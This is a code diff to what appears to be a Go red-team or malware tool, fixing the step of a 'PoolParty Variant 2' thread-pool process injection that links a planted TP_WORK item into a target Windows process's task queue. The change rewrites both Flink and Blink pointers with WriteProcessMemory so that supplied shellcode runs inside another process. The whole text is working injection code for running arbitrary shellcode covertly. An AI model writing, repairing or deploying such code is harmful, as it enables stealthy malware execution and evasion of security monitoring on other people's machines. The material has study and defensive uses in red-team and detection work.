@@ -550,22 +550,34 @@ func executeVariant2(shellcode []byte, pid uint32) (string, error) {
 	}
 	output += fmt.Sprintf("[+] Wrote TP_WORK structure (%d bytes)\n", bytesWritten)
 
-	// Step 12: Insert the work item into the task queue by updating the queue's LIST_ENTRY
-	// We need to update the Flink of the queue to point to our TP_WORK's Task.ListEntry
-	newListEntry := LIST_ENTRY{
-		Flink: tpWorkAddr + uintptr(unsafe.Offsetof(tpWork.Task)) + uintptr(unsafe.Offsetof(tpWork.Task.ListEntry)),
-		Blink: targetQueue.Queue.Blink,
-	}
+	// Step 12: Insert the work item into the task queue by updating both Flink and Blink
+	// Calculate the address of our TP_WORK's Task.ListEntry in the target process
+	remoteWorkItemTaskListAddr := tpWorkAddr + uintptr(unsafe.Offsetof(tpWork.Task)) + uintptr(unsafe.Offsetof(tpWork.Task.ListEntry))
+	
+	// Update the target queue's Flink to point to our TP_WORK
 	ret, _, err = procWriteProcessMemory.Call(
 		uintptr(hProcess),
-		targetTaskQueueAddr,
-		uintptr(unsafe.Pointer(&newListEntry)),
-		uintptr(unsafe.Sizeof(newListEntry)),
+		targetTaskQueueAddr+uintptr(unsafe.Offsetof(targetQueue.Queue)), // Address of Queue.Flink
+		uintptr(unsafe.Pointer(&remoteWorkItemTaskListAddr)),
+		uintptr(unsafe.Sizeof(remoteWorkItemTaskListAddr)),
 		uintptr(unsafe.Pointer(&bytesWritten)),
 	)
 	if ret == 0 {
-		return output, fmt.Errorf("WriteProcessMemory for queue insertion failed: %v", err)
+		return output, fmt.Errorf("WriteProcessMemory for queue Flink failed: %v", err)
 	}
+	
+	// Update the target queue's Blink to point to our TP_WORK
+	ret, _, err = procWriteProcessMemory.Call(
+		uintptr(hProcess),
+		targetTaskQueueAddr+uintptr(unsafe.Offsetof(targetQueue.Queue))+uintptr(unsafe.Sizeof(uintptr(0))), // Address of Queue.Blink
+		uintptr(unsafe.Pointer(&remoteWorkItemTaskListAddr)),
+		uintptr(unsafe.Sizeof(remoteWorkItemTaskListAddr)),
+		uintptr(unsafe.Pointer(&bytesWritten)),
+	)
+	if ret == 0 {
+		return output, fmt.Errorf("WriteProcessMemory for queue Blink failed: %v", err)
+	}
+	
 	output += "[+] Inserted TP_WORK into target process thread pool task queue\n"
 	output += "[+] PoolParty Variant 2 injection completed successfully\n"
 
